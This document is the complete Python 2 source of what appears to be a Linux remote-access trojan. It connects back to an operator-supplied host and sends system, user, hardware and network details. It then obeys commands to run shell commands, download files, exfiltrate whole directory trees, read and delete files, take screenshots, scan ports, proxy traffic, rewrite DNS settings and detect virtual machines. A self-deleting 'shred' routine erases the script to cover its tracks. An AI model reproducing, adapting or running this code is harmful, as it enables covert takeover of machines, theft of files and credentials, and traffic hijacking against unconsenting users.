#!/usr/bin/env python
# Remember to call sh()
import socket, subprocess as sp, sys, os, time, random, base64, signal, time, datetime
import threading, Queue
from thread import start_new_thread
from collections import OrderedDict, namedtuple

class Scanner(threading.Thread):
	def __init__(self, inq, outq):
		threading.Thread.__init__(self)
		self.setDaemon(1)
		# queues for (host, port)
		self.inq = inq
		self.outq = outq

	def run(self):
		while 1:
			host, port = self.inq.get()
			sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		
			try:
				sd.connect((host, port))
			except socket.error:
				self.outq.put((host, port, 'CLOSED'))
			else:
				self.outq.put((host, port, 'OPEN'))
				sd.close()

def queue_scan(host, start=1, stop=1024, nthreads=50):
	d = ""
	toscan = Queue.Queue()
	scanned = Queue.Queue()

	scanners = [Scanner(toscan, scanned) for i in range(nthreads)]
	for scanner in scanners:
		scanner.start()

	hostports = [(host, port) for port in xrange(start, stop+1)]
	for hostport in hostports:
		toscan.put(hostport)

	results = {}
	for host, port in hostports:
		while (host, port) not in results:
			nhost, nport, nstatus = scanned.get()
			results[(nhost, nport)] = nstatus
		status = results[(host, port)]
		if status <> 'CLOSED':
			d += '%d' % (port)
	return d

class Encryption_Objects:
	base64_object = False
	aes_object = False
	rsa_object = False
	struct_object = False

	aes_string = ""
	struct_string = ""

def proxy_server(webserver, port, conn, data, buffer_size):
	cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		cs.connect((webserver, port))
		cs.send(data)
		
		while True:
			reply = cs.recv(buffer_size)
			
			if(len(reply) > 0):
				conn.send(reply)
				print "OK"
			else:
				break
		cs.close()
	except Exception as e:
		cs.close()
		pass

def conn_string(conn, data, buffer_size):
	try:
		first_line = data.split('\n')[0]
		url = first_line.split(' ')[1]
		http_pos = url.find("://")
		if(http_pos == -1):
			temp = url
		else:
			temp = url[(http_pos+3):]
		port_pos = temp.find(":")
		
		webserver_pos = temp.find("/")
		if webserver_pos == -1:
			webserver_pos = len(temp)
		webserver = ''
		port = -1
		if(port_pos == -1 or webserver_pos < port_pos):
			port = 80
			webserver = temp[:webserver_pos]
		else:
			port = int((temp[(port_pos+1):])[:webserver_pos-port_pos-1])
			webserver = temp[:port_pos]
		
		proxy_server(webserver, port, conn, data, buffer_size)
	except Exception as e:
		return

def sys_users():
	data = ''
	try:
		import pwd, operator
	except ImportError:
		data = "\n[-] The Module Responsible Is Not Present On The Remote System\n"
		return data

	all_user_data = pwd.getpwall()
	interesting_users = sorted((u 
								for u in all_user_data 
								if not u.pw_name.startswith('_')),
								key=operator.attrgetter('pw_name'))

	username_length = max(len(u.pw_name) for u in interesting_users) + 1
	home_length = max(len(u.pw_dir) for u in interesting_users) + 1

	fmt = ' %-*s %4s %-*s %s\n'
	data += fmt % (username_length, 'User', 'UID', home_length, 'Home Dir', 'Description')
	data += " " + '-' * username_length +  '---- ' +  '-' * home_length + " " + '-' * 15 + "\n"

	for u in interesting_users:
		data += fmt % (username_length, u.pw_name, u.pw_uid, home_length, u.pw_dir.rstrip(","), u.pw_gecos.rstrip(","))

	return data

def scan_host(host, port, r_code = 1):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		code = s.connect_ex((host, port))

		if code == 0:
			r_code = code
		s.close()
	except Exception as e:
		pass

	return r_code

def scan_ports(host_ip, mini_port = 1, max_port = 1024, d = ''):
	for sel_port in range(mini_port, max_port):
		try:
			res = scan_host(host_ip, sel_port)

			if res == 0:
				d += "[+] %d\n" % (sel_port)
		except Exception as e:
			pass

	return d

def connect():
	try:
		host = sys.argv[1]
		port = int(sys.argv[2])
	except Exception as e:
		sys.exit(1)

	try:
		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		conn.connect((host,port))
	except socket.error:
		print "failed to connect"
		time.sleep(60)
		return

	x_info = user_info()

	conn.send(x_info)
	interactive_session(conn)

	conn.close()

def meminfo():
    meminfo=OrderedDict()

    with open('/proc/meminfo') as f:
        for line in f:
            meminfo[line.split(':')[0]] = line.split(':')[1].strip()
    return meminfo

def cpuinfo():
	cpuinfo=OrderedDict()
	procinfo=OrderedDict()

	nprocs = 0
	with open('/proc/cpuinfo') as f:
		for line in f:
			if not line.strip():
				cpuinfo['proc%s' % nprocs] = procinfo
				nprocs=nprocs+1
				procinfo=OrderedDict()
			else:
				if len(line.split(':')) == 2:
					procinfo[line.split(':')[0].strip()] = line.split(':')[1].strip()
				else:
					procinfo[line.split(':')[0].strip()] = ''
			
	return cpuinfo

def load_checksum():
	try:
		import hashlib
	except Exception as e:
		return "0x00"

	BLOCKSIZE = 65535

	try:
		hasher = hashlib.sha512()
	except Exception as e:
		try:
			hasher = hashlib.sha384()
		except Exception as e:
			try:
				hasher = hashlib.sha256()
			except Exception as e:
				try:
					hasher = hashlib.sha224()
				except Exception as e:
					try:	
						hasher = hashlib.sha1()
					except Exception as e:
						return "0x00"

	with open(os.path.abspath(__file__)) as ptr:
		bu = ptr.read(BLOCKSIZE)
		while len(bu) > 0:
			hasher.update(bu)
			bu = ptr.read(BLOCKSIZE)

	return hasher.hexdigest()

def user_info():
	x_info = ""

	for x in os.uname()[:-1]:
		x_info += x + ","
	
	try:
		import platform
		x_info += ' '.join(platform.architecture()) + ","
	except Exception as e:
		x_info += os.uname()[-1] + ","

	cpu = ''
	cpuinf = cpuinfo()
	for processor in cpuinf.keys():
		cpu += str(cpuinf[processor]['model name']) + "<#>"
	cpu = cpu[:-3]

	meminf = meminfo()
	tmemory = '{0}'.format(meminf['MemTotal'])
	fmemory = '{0}'.format(meminf['MemFree'])

	user = str(username())

	if user == "Unknown User" or user == "None":
		user = "Unknown User"

	try:
		x_info += user + "," + os.getcwd()

		if user == "Unknown User":
			x_info += ",Unable To Retrieve User Comment"
			x_info += "," + str(os.getuid()) + " " + str(os.getgid()) + " " + str(os.getpid())
			x_info += "," + os.getenv('HOME')
			x_info += ",Unable To Retrieve User Shell"
			x_info += "," + cpu + "," + tmemory + "," + fmemory + "," + load_checksum()
		else:
			import pwd
			info = pwd.getpwnam(user)
			x_info += "," + info.pw_gecos.rstrip(",")
			x_info += "," + str(info.pw_uid) + " " + str(info.pw_gid) + " " + str(os.getpid())
			x_info += "," + info.pw_dir
			x_info += "," + info.pw_shell
			x_info += "," + cpu + "," + tmemory + "," + fmemory + "," + load_checksum()
	except ImportError:
		x_info += ",Unable To Retrieve User Comment"
		x_info += "," + str(os.getuid()) + " " + str(os.getgid()) + " " + str(os.getpid())
		x_info += "," + os.getenv('HOME')
		x_info += ",Unable To Retrieve User Shell"
		x_info += "," + cpu + "," + tmemory + "," + fmemory + "," + load_checksum()

	return x_info

def username():
	user = ''
	try:
		user = os.getlogin()
	except OSError:
		user = os.getenv('USER')
		if user == None:
			try:
				import getpass
				user = getpass.getuser()
			except Exception:
				user = "Unknown User"

	return user

def encryption_encrypt(final):
	if Encryption_Objects.base64_object == True:
		final = final.encode('base64').replace("\n", "<bk>")

	return final

def encryption_decrypt(data):

	if Encryption_Objects.base64_object == True:
		data = base64.b64decode(data.replace("<bk>","\n"))

	return data

def recv_file_in(conn, directory, filename,byte):
	filename = directory + "/" + filename.split("/")[-1]

	with open(filename, "wb") as file_handler: 
		total_bytes_to_receive = long(byte)
		p = retrieve_encryption_buffer_size(2)
		data = conn.recv(p)
		file_handler.write(data)
		total_bytes = len(data)
		while total_bytes < total_bytes_to_receive and len(data) != 0: 
			data = conn.recv(p)
			file_handler.write(data)
			total_bytes += len(data)

def send_data(conn, data):
	length = str(len(data)).zfill(16)
	final = data

	final = encryption_encrypt(length + data)

	conn.send(final)

def enumerate_find_send(conn,directory,filename):
	found = ''
	for root, dirs, files in os.walk(directory):
		for names in files:
			if filename in names:
				found += os.path.abspath(os.path.join(root, names)) + '\n'
	send_data(conn, found)

def enumerate_directories(directory):
	found = ''
	f_found = 0
	f_size = 0
	for root, dirs, files in os.walk(directory):
		for x in dirs:
			try:
				found += root + "/" + x + ","
			except Exception:
				pass
		for xr in files:
			f_found += 1
			try:
				f_size += os.path.getsize(os.path.abspath(os.path.join(root, xr)))
			except OSError:
				pass

	final = str(f_found) + "," + str(f_size)
	found = found[0:-1] + "#" + final

	return found

def retrieve_encryption_buffer_size(code):
	b_size = 0

	if Encryption_Objects.base64_object == True:
		if code == 0:
			b_size = 36
		elif code == 1:
			b_size = 2876
		elif code == 2:
			b_size = 4040
	else:
		if code == 0:
			b_size = 36
		elif code == 1:
			b_size = 2048
		elif code == 2:
			b_size = 65535
	return b_size

def sys_block_path():
	path = "/sys/block"
	return path

def list_all_connected_devices():
	path = sys_block_path()
	available_devices = {}

	if os.path.exists(path):
		for root, dirs, files in os.walk(path):
			for x in dirs:
				if x.count("sd") != 0 or x.count("hd") != 0:
					full_path = os.path.abspath(os.path.join(root, x))
					if os.path.realpath(full_path).count("/usb") != 0:
						available_devices[full_path] = "USB Disk Device"
					elif os.path.realpath(full_path).count("/ata") != 0:
						available_devices[full_path] = "Hard Disk Device"

	return available_devices

def get_device_basename(device_path):
	return os.path.basename(device_path)

def read_content(path):
	f = open(path, "r")
	status = ''.join(f.readlines()).strip()
	f.close()
	return status

def get_drive_size(device_path):
	path = device_path + "/size"
	path1 = device_path + "/queue/hw_sector_size"

	if os.path.exists(path):
		status = int(read_content(path))

		if os.path.exists(path1):
			status1 = int(read_content(path1))
			status *= status1
		else:
			status *= 512

		return status

def get_drive_model(device_path):
	path = device_path + "/device/model"

	if os.path.exists(path):
		status = read_content(path)
		return status

	return "Unknown Model"

def get_drive_vendor(device_path):
	path = device_path + "/device/vendor"

	if os.path.exists(path):
		status = read_content(path)
		return status

	return "Unknown Vendor"

def is_device_removable(device_path):
	path = device_path + "/removable"

	if os.path.exists(path):
		status = read_content(path)

		if status == "1":
			return "Yes"
		elif status == "0":
			return "No"
		else:
			return "Unknown"

	return "Unknown"

def device_path_check(device_name):
	device_name = "/dev/" + device_name

	if os.path.exists(device_name):
		return device_name
	else:
		return "Not Found"

def uevent_reader(device_path, device_name):
	path = device_path + "/partition"

	if os.path.exists(path):
		d = int(read_content(path))
		if(os.path.exists("/dev/" + device_name)):
			if d == 1:
				return "[+] Partition Found ( /dev/%s ): Primary," % (device_name)
			elif d == 2:
				return "[+] Partition Found ( /dev/%s ): Extended," % (device_name)
			elif d == 5:
				return "[+] Partition Found ( /dev/%s ): Logical," % (device_name)
			else:
				return "[+] Partition Found ( /dev/%s ): Unknown type," % (device_name)

	return ""

def collector():
	sl = ""
	drive = list_all_connected_devices()
	for device_path in drive:

		drive_name = get_device_basename(device_path)
		removable = is_device_removable(device_path)
		drive_size = get_drive_size(device_path)
		model_name = get_drive_model(device_path)
		vendor_name = get_drive_vendor(device_path)
		device_pathx = device_path_check(drive_name)

		sl += "[+] Device Name: %s," % (drive_name)
		sl += "[+] Device Path: %s," % (device_pathx)
		sl += "[+] Device Type: %s," % (drive[device_path])
		sl += "[+] Removable: %s," % (removable)
		sl += "[+] Device Capacity: %s," % (drive_size)
		sl += "[+] Device Model: %s," % (model_name)
		sl += "[+] Device Vendor: %s," % (vendor_name)

		if device_pathx != "Not Found":
			path = sys_block_path() + "/" + drive_name

			for root, dirs, files in os.walk(path):
				for x in dirs:
					if x[:len(drive_name)] == drive_name:
						p = root + "/" + x
						sl += uevent_reader(p, x)
		sl = sl[:-1]
		sl += "<#>"

	return sl

def enumerate_read_send(conn, start_dir):
	for x, y, z in os.walk(start_dir):
		for names in z:
			data = ''
			names = os.path.abspath(os.path.join(x, names))

			try:
				data = str(str(os.path.getsize(names)).zfill(16) + "#" + names).zfill(2048)
			except Exception:
				pass

			try:
				print names
				with open(names, 'rb') as stream_reader:
					conn.send(encryption_encrypt(data))

					data = stream_reader.read(retrieve_encryption_buffer_size(1))
					data = encryption_encrypt(data)

					if len(data) != 0:
						conn.send(data)
					else:
						conn.send(encryption_encrypt("<OK>"))

					while data != "" and len(data) != 0:
						data = stream_reader.read(retrieve_encryption_buffer_size(1))
						data = encryption_encrypt(data)
						conn.send(data)
					conn.send(encryption_encrypt("<OK>"))
			except IOError:
				pass
	print "Am done bia............................................................."

def initiate_file_transfer(conn, filename):
	time.sleep(1)

	with open(filename, 'rb') as stream:
		data = stream.read(retrieve_encryption_buffer_size(1))
		data = data
		
		conn.send(data)
		while data != "":
			data = stream.read(retrieve_encryption_buffer_size(1))
			data = data
			conn.send(data)

def getHwAddr(ifname):
	import fcntl, struct
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15]))
	return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]

def netdevs():
	with open('/proc/net/dev') as f:
		net_dump = f.readlines()
	
	device_data={}
	data = namedtuple('data',['rx','tx'])
	for line in net_dump[2:]:
		line = line.split(':')
		device_data[line[0].strip()] = data(line[1].split()[0], line[1].split()[8])
	
	return device_data

def localifs():
	try:
		import fcntl, array, struct, platform
	except Exception:
		return [('Failed To Collect', 'No IP Gathered', 'No Mac Associated', 'No RX', 'No TX')]

	SIOCGIFCONF = 0x8912
	MAXBYTES = 8096

	arch = platform.architecture()[0]

	var1 = -1
	var2 = -1
	if arch == '32bit':
		var1 = 32
		var2 = 32
	elif arch == '64bit':
		var1 = 16
		var2 = 40
	else:
		return [('Failed To Collect', 'No IP Gathered', 'No Mac Associated', 'No RX', 'No TX')]

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	names = array.array('B', '\0' * MAXBYTES)
	outbytes = struct.unpack('iL', fcntl.ioctl(sock.fileno(),SIOCGIFCONF,struct.pack('iL', MAXBYTES, names.buffer_info()[0])))[0]
	namestr = names.tostring()
	
	dpe = ''
	netdev = netdevs()
	for i in xrange(0, outbytes, var2):
		iname = str(namestr[i:i+var1].split('\0', 1)[0])
		dpe += iname + "," + str(socket.inet_ntoa(namestr[i+20:i+24])) + "," + str(getHwAddr(str(namestr[i:i+var1].split('\0', 1)[0]))) + "," + str(netdev[iname].rx) + "," + str(netdev[iname].tx) + "#"
	return dpe[0:-1]

def execute_command(command):
	sh = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
	out, err = sh.communicate()
	returncode = sh.returncode
	return out, err, returncode

def sh():
	p = os.path.abspath(__file__)

	out, err,returncode = execute_command("shred -fuz %s" % (p))

	if returncode != 0:
		k = 0
		z = 4

		while k != z:
			with open(p, "wb") as pr:
				pr.write(str(random.randint(9999,999999)))
			k += 1
		os.unlink(p)

def interactive_session(conn):
	xdirectory = os.getcwd()
	while 1:
		try:

			command = encryption_decrypt(str(conn.recv(2048)))
		except socket.error:
			sys.exit(1)
		except Exception as e:
			sys.exit(1)

		if command.split(" ")[0] == "exec":
			res = 1
			msg = ""

			while len(command.split(" ")) > res:
				msg += command.split(" ")[res] + " "
				res += 1

			out, err, returncode = execute_command("cd '" + xdirectory + "';" + msg)
			
			result = str(out) + str(err)

			if result == "" and returncode == 0:
				result = "Successful Execution"

			if len(err) != 0 and returncode != 0:
				result = "[-] Unknown Command"

			send_data(conn, result)
		elif command.split(" ")[0] == "download":
			url = command.split(" ")[1]
			f_name = command.split(" ")[2]

			try:
				import urllib2
			except ImportError:
				send_data(conn, "Urllib2 is not installed on Remote Host")
				continue

			try:
				u = urllib2.urlopen(url)
			except Exception:
				send_data(conn, "Connection to the Download Host from Remote Host failed.")
				continue

			try:
				f = open(f_name, 'wb')
			except Exception:
				send_data(conn, "Cannot write to specified directory.")
				continue

			meta = u.info()

			try:
				file_size = int(meta.getheaders("Content-Length")[0])
				send_data(conn, "[OK]%s,%s" % (file_size, os.path.abspath(f_name)))
			except Exception:
				send_data(conn, "Cannot Determine file size.")
				continue

			file_size_dl = 0
			block_sz = 8192

			while True:
				buf = u.read(block_sz)
				if not buf:
					break

				file_size_dl += len(buf)
				f.write(buf)

				status = " %s [ %3.2f% % ]" % (file_size_dl, file_size_dl * 100. / file_size)
				send_data(conn, status)

			f.close()
			send_data(conn, "[X][X]xDownload[X][X]")
		elif command.split(" ")[0] == "sys_users":
			res = sys_users()
			send_data(conn, res)
		elif command.split(" ")[0] == "send":
			directory = ""
			filename = ""

			if len(command.split(" ")) == 2:
				directory = xdirectory
				filename = command.split(" ")[1]
			else:
				directory = command.split(" ")[1]
				filename = command.split(" ")[2]

			if os.path.exists(directory) == False:
				conn.send("DirerrorOK")
			else:
				conn.send("ALLSYSISGO")
				size = long(conn.recv(24)[5:])
				conn.send("ACK")
				recv_file_in(conn, directory, filename,size)
		elif command.split(" ")[0] == "encryption":
			if len(command.split(" ")) == 1:
				res = ""
				try:
					import base64
					res = "[+] Base64 Encoding Is Supported"
				except ImportError:
					res = "[-] Base64 Encoding Is Not Supported"

				try:
					from Crypto.Cipher import AES
					from Crypto.Hash import SHA256
					res += "\n[+] AES Encryption Is Supported"
				except ImportError:
					res += "\n[-] AES Encryption Is Not Supported"

				try:
					from Crypto.Cipher import PKCS1_OAEP
					from Crypto.PublicKey import RSA
					res += "\n[+] RSA Encryption Is Supported"
				except ImportError:
					res += "\n[-] RSA Encryption Is Not Supported"

				try:
					import struct
					res += "\n[+] Struct Packing Is Supported"
				except ImportError:
					res += "\n[+] Struct Packing Is Not Supported\n"

				send_data(conn, res)
			elif len(command.split(" ")) == 2 and command.split(" ")[1] == "base64":
				#Base64
				try:
					import base64
					send_data(conn, "OK")
					Encryption_Objects.base64_object = True
				except ImportError:
					Encryption_Objects.base64_object = False
					send_data(conn, "FAIL")
					continue
			elif len(command.split(" ")) == 2 and command.split(" ")[1] == "--disable":
				send_data(conn, "OK")
				Encryption_Objects.base64_object = False
				Encryption_Objects.struct_object = False
				Encryption_Objects.aes_object = False
				Encryption_Objects.rsa_object = False
		elif command.split(" ")[0] == "terminate":
			pid = int(command.split(" ")[1])

			try:
				os.kill(pid, signal.SIGTERM)
				send_data(conn, "OK")
			except OSError:
				send_data(conn, "FAIL")
			except Exception as e:
				send_data(conn, "%s" % (str(e)))
		elif command.split(" ")[0] == "clone":
			start_dir = ' '.join(command.split(" ")[1:])
			directories = enumerate_directories(start_dir)
			send_data(conn, directories)
			ack = conn.recv(12)
			if ack == "ACKNOWLEDGED":
				enumerate_read_send(conn, start_dir)
		elif command.strip() == "pwd":
			send_data(conn, "[OK]%s" % (xdirectory))
		elif command.split(" ")[0] == "cd":
			res = 1
			args = ""

			while len(command.split(" ")) > res:
				args += command.split(" ")[res] + " "
				res += 1

			args = args.strip().replace("//", "/")
			if args[0] == "/":
				if os.path.isdir(args) == False:
					send_data(conn, "1")
				else:
					if args[-1] == "/" and len(args) > 1:
						args = args[:-1]
					xdirectory = os.path.normpath(args).replace("//", "/")
					send_data(conn, xdirectory)
			else:
				tmp = os.path.normpath(xdirectory + "/" + args).replace("//", "/")
				if os.path.isdir(tmp) == False:
					send_data(conn, "1")
				else:
					xdirectory = tmp
					send_data(conn, xdirectory)

		elif command.split(" ")[0] == "kill":
			send_data(conn,"Shell@" + os.uname()[1] +" Shutdown Successful")
			time.sleep(2)
			conn.close()
			sys.exit(0)
		elif command.split(" ")[0] == "screenshot":
			try:
				import pyscreenshot as ImageGrab
				im = ImageGrab.grab()

				tmp_dir = ''

				try:
					import tempfile
					tmp_dir = tempfile.gettempdir() + "/"
				except ImportError as e:
					tmp_dir = "/tmp/"

				tmp_fname = "." + str(random.randint(0,1000000000)) + '.png'
				
				tmp_name = tmp_dir + tmp_fname

				ImageGrab.grab_to_file(tmp_name)

				f_data = open(tmp_name, 'rb')
				f_datar = f_data.read()
				f_data.close()
				
				send_data(conn, "0<3>" + tmp_fname + "<3>" + f_datar)
				
				os.unlink(tmp_name)
				continue
			except Exception as e:
				pass

			try:
				from PyQt4.QtGui import QPixmap, QApplication
				app = QApplication(sys.argv)

				try:
					import tempfile
					tmp_dir = tempfile.gettempdir() + "/"
				except Exception:
					tmp_dir = "/tmp/"

				tmp_fname = str(random.randint(0,1000000000)) + '.png'
				
				tmp_name = tmp_dir + tmp_fname

				QPixmap.grabWindow(QApplication.desktop().winId()).save(tmp_name, 'png')

				f_data = open(tmp_name, 'rb')
				f_datar = f_data.read()
				f_data.close()
				
				send_data(conn, "0<3>" + tmp_fname + "<3>" + f_datar)
				
				os.unlink(tmp_name)
				continue
			except Exception as e:
				pass

			send_data(conn, "1<3>The Current Supported Modules Are Not Installed On Remote Host\n\n	 PyScreenShot { easy_install pyscreenshot, pip install pyscreenshot }\n	 PyQt4 QtGui QPixmap QApplication { apt-get install <> }")
		elif command.split(" ")[0] == "devices":
			dpe = collector()
			send_data(conn, str(dpe))
		elif command.split(" ")[0] == "interfaces":
			dp = localifs()
			send_data(conn, str(dp))
		elif command.split(" ")[0] == "surf_proxy":
			buffer_size = 65535

			for x in command.split(" ")[1:]:
				d = x.strip()
				if d[:3] == "bs=" and d[3:].isdigit() == True and d[3:] <= 65535:
					buffer_size = int(d[3:])

			send_data(conn, "OK")

			while 1:
				try:
					rdata = conn.recv(buffer_size)

					if rdata != "quit":
						start_new_thread(conn_string, (conn, rdata, buffer_size,))
				except Exception as e:
					send_data(conn, "[-2]Reason:" + str(e))
					return

		elif command.split(" ")[0] == "dnsch":
			path = "/etc/resolv.conf"
			dns = "# Generated by NetworkManager\n"

			for x in command.strip().split(" ")[1:]:
				if x[:8] == "--conf={" and x[-1] == "}":
					d = x[8:]
					d = d[:-1]
					path = d
				elif x.count(".") == 3:
					dns += "nameserver %s\n" % (x.strip())
			
			if os.access(path, os.F_OK):
				if os.access(path, os.W_OK):
					with open(path, "wb") as conf:
						conf.write(dns)

					send_data(conn,"[+] DNS Configuration Changed")
				else:
					send_data(conn,"[-] The file \"%s\" is not writable" % (path))
			else:
				send_data(conn,"[-] The file \"%s\" does not exist" % (path))
		elif command.split(" ")[0] == "portscan":
			mini_port = 1
			max_port = 1024
			host_addr = ''
			flawed_addr = ''

			arguments = command.split(" ")[1:]

			for x in arguments:
				if x[:3] == "p={" and x[-1] == "}" and x.count(",") == 1:
					d = x
					d = d[3:]
					d = d[:-1].split(",")
					try:
						mini_port = int(d[0].strip())
						max_port = int(d[1].strip())
					except Exception as e:
						mini_port = 1
						max_port = 1024
				elif x[:2] == "t=" and x.count(".") == 3:
					d = x
					d = d[2:].strip()
					try:
						host_addr = socket.gethostbyname(d)
					except Exception as e:
						host_addr = ''
						flawed_addr = d
						continue

			if host_addr == '':
				send_data(conn, "[-] Hosterror:%s" % (flawed_addr))
			else:
				dp = scan_ports(host_addr, mini_port, max_port)
				send_data(conn, str(dp))
		elif command.split(" ")[0] == "cat":
			file_path = ' '.join(command.split(' ')[1:])
			fils = file_path.split(",")

			final_data = ""

			for each_x in fils:
				each_x = each_x.strip()

				if each_x[0] != "/":
					each_x = xdirectory + "/" + each_x

				if os.path.exists(each_x):
					fopen = open(each_x, 'rb')
					k = fopen.read()
					fopen.close()
					final_data += "[+] File Content for: %s\n\n%s\n\n" % (each_x, k)
				else:
					final_data += "[-] File Doesn't Exist for: %s\n\n" % (each_x)

			send_data(conn, final_data)
		elif command.split(" ")[0] == "remove":
			filepath = ' '.join(command.split(" ")[1:])
			t = ''
			for x in filepath.split(","):
				path = x.strip()

				if path[0] != "/":
					path = xdirectory + "/" + path

				if os.path.exists(path):
					try:
						os.unlink(path)
						t += "[+] %s has been deleted.\n" % (path)
					except OSError:
						t += "[-] %s failed to be deleted.\n" % (path)
					except Exception as e:
						t += str(e)
				else:
					t += "[-] %s does not exist." % (path)

			send_data(conn, t)
		elif command.strip() == "check_priv":
			if not os.geteuid() == 0:
				st = "[-]FAIL[-]"
			else:
				st = "[+]SUCCESS[+]"
			send_data(conn, st)
		elif command.split(" ")[0] == "ps":
			argum = ""

			if len(command.split(" ")) > 1:
				argum = ' '.join(command.split(" ")[1:])
			else:
				argum = "aux"
			
			out, err, returncode = execute_command("ps %s" % (argum))

			msg = str(out) + str(err)

			send_data(conn, msg)
		elif command.split(" ")[0] == "ls":
			directory = ' '.join(command.split(" ")[1:])

			if os.path.isdir(directory) == False:
				send_data(conn, "[-] Directory Does Not Exist!")
				continue

			out, err, returncode = execute_command("ls -la \"%s\"" % (directory))

			msg = str(out) + str(err)

			send_data(conn, msg)
		elif command.split(" ")[0] == "lookup":
			directory = command.split(" ")[2]
			filename = command.split(" ")[1]

			if os.path.isdir(directory) == False:
				send_data(conn, "D-error")
			else:
				send_data(conn, "D-ok")
				time.sleep(1)
				enumerate_find_send(conn,directory,filename)
				
		elif command.split(" ")[0] == "retrieve":
			filename = ' '.join(command.split(" ")[1:])
			b = retrieve_encryption_buffer_size(0)

			if os.path.isfile(filename) == False:
				msg = "IO-error"
				enc = msg
				enc += '~' * (b - (len(enc) % b))
				conn.send(enc)
			elif os.path.isdir(filename):
				msg = "Direrror"
				enc = msg
				enc += '~' * (b - (len(enc) % b))
				conn.send(enc)
			elif os.path.exists(filename) == False:
				msg = "IO-error"
				enc = msg
				enc += '~' * (b - (len(enc) % b))
				conn.send(enc)
			else:
				fsize = str(os.path.getsize(filename)).zfill(16)
				msg = "OK-SIZE:" + fsize
				enc = msg
				
				conn.send(enc)
				initiate_file_transfer(conn, filename)
		elif command.split(" ")[0] == "check_vm":
			return_data = ''

			###########################################################################################
			out, err, returncode = execute_command("dmesg | grep 'Hypervisor detected'")
			if returncode == 0:
				if "Hypervisor detected" in out and "virtualbox" in out.strip().lower():
					return_data += "[+] Virtualization Technology:: VirtualBox\n"
				elif "Hypervisor detected" in out and "kvm" in out.strip().lower():
					return_data += "[+] Virtualization Technology:: KVM\n"
			###########################################################################################
			out, err, returncode = execute_command("dmidecode | egrep -i 'manufacturer|product'")
			if returncode == 0:
				if "microsoft" in out.strip().lower() and "corporation" in out.strip().lower() and "virtual" in out.strip().lower():
					return_data += "[+] Virtualization Technology:: Microsoft VirtualPC\n"
			###########################################################################################
			out, err, returncode = execute_command("dmidecode -s system-product-name")
			if returncode == 0:
				if out.strip() == "VirtualBox":
					return_data += "[+] Virtualization Technology:: VirtualBox\n"
				elif "vmware" in out.strip().lower():
					return_data += "[+] Virtualization Technology:: VMware Virtual Platform\n"
				elif "kvm" in out.strip().lower():
					return_data += "[+] Virtualization Technology:: Qemu with KVM\n"
				elif "bochs" in out.strip().lower():
					return_data += "[+] Virtualization Technology:: Qemu () Emulated )\n"
			#############################################################################################
			out, err, returncode = execute_command("ls -1 /dev/disk/by-id/")
			if returncode == 0:
				if "VBOX_HARDDISK" in out or "VBOX_CD-ROM" in out:
					return_data += "[+] Virtualization Technology:: VirtualBox\n"
				elif "QEMU_HARDDISK" in out or "QEMU_CD-ROM" in out or "QEMU_DVD-ROM" in out:
					return_data += "[+] Virtualization Technology:: QEMU\n"
			##############################################################################################
			out, err, returncode = execute_command("lsmod")
			if returncode == 0:
				if "vboxguest" in out or "vboxvideo" in out:
					return_data += "[+] Virtualization Technology:: VirtualBox\n"
			##############################################################################################
			out, err, returncode = execute_command("dmidecode")
			if returncode == 0:
				if "permission denied" in out.strip().lower() and "/dev" in out.strip().lower():
					return_data += "[+] Virtualization Technology:: Virtuozzo\n"
			##############################################################################################
			out, err, returncode = execute_command("dmidecode | grep -i domU")
			if returncode == 0:
				if "hvm" in out.strip().lower() and "domu" in out.strip().lower():
					return_data += "[+] Virtualization Technology:: HVM domU\n"

			###############################################################################################
			if len(return_data) == 0 or return_data == "":
				return_data = "[-] Unable to detect any virtualization environment."

			send_data(conn, return_data)

if __name__ == "__main__":
	while True:
		#sh()
		connect()